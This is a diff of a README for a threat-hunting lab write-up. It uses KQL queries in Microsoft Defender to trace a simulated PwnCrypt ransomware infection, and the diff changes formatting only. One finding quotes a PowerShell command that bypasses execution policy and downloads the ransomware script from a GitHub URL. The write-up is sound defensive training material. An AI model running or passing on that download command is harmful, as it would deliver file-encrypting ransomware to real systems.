@@ -2,12 +2,12 @@
 
 <img width="1536" height="1024" alt="image" src="https://github.com/user-attachments/assets/84b28057-5767-4402-adaa-68f7214615ca" />
 
-## 📖Scenario
+## 📖 Scenario
 
 A new ransomware strain called PwnCrypt has emerged, using a PowerShell-based payload to encrypt files with AES-256 encryption and adding a .pwncrypt extension to targeted files. The CISO is worried about its potential spread to the corporate network and intends to investigate further.
 
-## 🕵️‍♂️Data Collection
-Inspect DeviceFileEvents logs in MS Defender for .pwncrpyt string
+## 🕵️‍♂️ Data Collection
+📊 Inspect DeviceFileEvents logs in MS Defender for .pwncrpyt string
 
 ```kql
 let suspectDevice = "windows10vm";
@@ -19,11 +19,11 @@ DeviceFileEvents
 ```
 <img width="1621" height="663" alt="スクリーンショット 2025-08-05 11 04 54" src="https://github.com/user-attachments/assets/367446b4-c874-470f-8551-f09ae8f0df43" />
 
-🔍Findings
+🔍 Findings
 - Files appended with .pwncrypt indicate the ransomeware has spread to our systems
 - Initiating process confirms PowerShell-based script at C:\programdata\pwnscript.ps1 using -ExecutionPolicy Bypass
 
-Inspect DeviceNetworkEvents for any "Invoke-WebRequest" 
+📊 Inspect DeviceNetworkEvents for any "Invoke-WebRequest" 
 
 ```kql
 let suspectDevice = "windows10vm";
@@ -37,7 +37,7 @@ DeviceNetworkEvents
 🔍Findings
 - Confirmed command line run by "labuser" to callout to github and save file locally. "pwncrypt.ps1 to C:\programdata "powershell.exe  -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/pwncrypt.ps1 -OutFile C:\programdata\pwncrypt.ps1"
 
-Data Analysis
+## 🔬Data Analysis
 
 Hypothothis
 - User "labuser," with admin permissions, ran command line code that downloaded PwnCrypt ransomware to the machine. Pwncrypt encoded files and demanded a bitcoin ransom.
